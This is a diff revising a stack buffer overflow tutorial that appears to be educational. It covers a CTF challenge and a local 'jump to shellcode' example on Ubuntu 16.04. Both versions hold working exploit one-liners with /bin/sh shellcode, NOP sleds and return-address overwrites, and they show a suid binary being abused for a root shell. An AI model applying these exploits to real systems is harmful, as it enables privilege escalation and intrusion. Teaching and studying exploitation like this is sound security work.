@@ -25,6 +25,7 @@ So lets jump right in and smash the stack!
 ### Environment  
 * [Kali 2017.2](https://www.kali.org/news/kali-linux-2017-2-release/)
 * [GDB Peda](https://github.com/longld/peda)
+* [Ubuntu 16.04.3](http://releases.ubuntu.com/16.04/)
 
 Example 1 - Stack buffer overflow basic 1
 -----------------------------------------
@@ -180,7 +181,7 @@ So, we overwrote the check variable with our buffer, as 0x41 is the hex code for
 ```python
 import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)
 ```
-We run this and pipe it into our binary, and while we get a shell it isn't returned to us as interactive. (There was ways around this, I think). 
+We run this and pipe it into our binary, and while we get a shell it isn't returned to us as interactive.
 ```bash
 app-systeme-ch13@challenge02:~$ python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef);' | ./ch13
 
@@ -364,18 +365,24 @@ So let's see this in action!
 Example 3 - Jumping to Shellcode
 ------------
 
-For this we'll use the following C program example.  This will make our job much easier as it will print out the location of the buffer in memory, removing the need for diving too deep into GDB internals for now.  It also makes our job easier as memory locations will be different within and outside of GDB.
+For this we'll use the following C program example.  This will make our job much easier as it will print out the location of the buffer in memory, removing the need for diving too deep into GDB internals for now.  It also makes our job easier as memory locations will be different within and outside of GDB.  The environment I will be using for this will be Ubuntu 64-bit 16.04.3
 
 ```c
 #include <stdio.h>
 
-int main()
+int main(){
+	bof();
+	return 0;
+}
+
+int bof()
 {
 	char buffer[128];
 	printf("Wanna Smash!?: %p\n", (void*)&buffer);
 	gets(buffer);
 	return 0;
 }
+
 ```
 We want to disable ASLR and also compile this file without stack protections.  This also compiles it to 32-bit as the process is very slightly different if dealing with a 64-bit binary.
 
@@ -386,59 +393,48 @@ gcc test.c -o test  -fno-stack-protector -z execstack -m32
 
 Running the file reveals the 
 ```bash
-root@kali:~/Documents/temp# ./test
-Wanna Smash!?: 0xffffd280
-
-Did it work?:
+ubuntu@ubuntu:/tmp$ ./test
+Wanna Smash!?: 0xffffcfd0
 ```
 
-Again, we place the output of our favourite pattern creator into the binary when it asks for input, but we're greeted with a very different error than before.
-```bash
-Invalid $SP address: 0x3365412e
-```
-
-So we've overwritten `ebp` and it appears to have failed once `esp` is overwritten.  This isn't typical of most CTF's and I wasn't able to work out how to fix this during compilation, but we can pretty easily bypass it.  The invalid `$SP` address is at position 128 in our buffer, so at position 128 in our buffer we just write a new `esp` which we will point next to our `eip` address.
-```python
-python -c "from struct import pack; print 'A'*128 + pack('<L', 0xffffd280+136) + 'B'*4+ 'C'*4"  > /tmp/var
-```
-
-In the pack part of our exploit above, the 136 part of our exploit was manually determined by adjusting it until the program wrote `0x42424242` or 'BBBB' into the EIP.  As we see below the above exploit succeeded in overwriting EIP.  
+We create a pattern and input it into the binary, and as we see below we succeeded in overwriting EIP.  
 ```gdb
 EAX: 0x0 
-EBX: 0x42424242 ('BBBB')
-ECX: 0xffffd2b8 ("CCCC")
-EDX: 0xf7fae87c --> 0x0 
-ESI: 0x1 
-EDI: 0xf7fad000 --> 0x1b9db0 
-EBP: 0x43434343 ('CCCC')
-ESP: 0xffffd2b8 ("CCCC")
-EIP: 0x42424242 ('BBBB')
-```
-Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root regardless.  We then change to an alternative unprivileged user, and use the binary to get the position of the buffer.
-```bash
-root@kali:~/Documents/temp# chmod u+s test
-root@kali:~/Documents/temp# su - frank
-No directory, logging in with HOME=/
-$ id
-uid=1000(frank) gid=1000(frank) groups=1000(frank)
-$ cd /root/Documents/temp
-$ (cat /tmp/var; cat) | ./test
-Wanna Smash!?: 0xffffdc90
-Segmentation fault
+EBX: 0x0 
+ECX: 0xf7fb85a0 --> 0xfbad2288 
+EDX: 0xf7fb987c --> 0x0 
+ESI: 0xf7fb8000 --> 0x1afdb0 
+EDI: 0xf7fb8000 --> 0x1afdb0 
+EBP: 0x41514141 ('AAQA')
+ESP: 0xffffd030 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41416d41 ('AmAA')
 ```
 
-In our payload we then place the following shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php
+```
+gdb-peda$ pattern offset 0x41416d41
+1094806849 found at offset: 140
+```
+We see it's at position 140.  Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root regardless.  We then change to an alternative unprivileged user, and use the binary to get the position of the buffer.
+```bash
+ubuntu@ubuntu:/tmp$ sudo chown root:root ./test
+[sudo] password for ubuntu: 
+ubuntu@ubuntu:/tmp$ sudo chmod u+s ./test
+ubuntu@ubuntu:/tmp$ ./test
+Wanna Smash!?: 0xffffcfd0
+```
+
+In our payload we then place the following shellcode: http://shell-storm.org/shellcode/files/shellcode-606.php
 ```python
-python -c "from struct import pack; print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'.ljust(128,'\x90') + pack('<L', 0xffffdc90+136) + pack('<L', 0xffffdc90)+ 'C'*4"  > /tmp/var
+python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffcfd0)"  > /tmp/var
 ```
 
 You'll notice here I've used ljust on the shellcode.  This just pads the string to the determined length of 128 and pads it with NOP instructions, so it makes the process of creating a nopsled slightly easier.  Run the binary, inputting the payload, we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) does, indicating we now have root privileges.
 
 ```bash
-$ (cat /tmp/var; cat) | ./test
-Wanna Smash!?: 0xffffdc90
+ubuntu@ubuntu:/tmp$ (cat /tmp/var; cat) | ./test
+Wanna Smash!?: 0xffffcfd0
 id
-uid=1000(frank) gid=1000(frank) euid=0(root) groups=1000(frank)
+uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
 
 
@@ -459,7 +455,7 @@ References
 [RopEmporium - ret2win](https://ropemporium.com/challenge/ret2win.html)  
 [ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1)  
 [Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)  
-http://shell-storm.org/shellcode/files/shellcode-827.php  
+http://shell-storm.org/shellcode/files/shellcode-606.php
 
 Other Literature
 ---------------
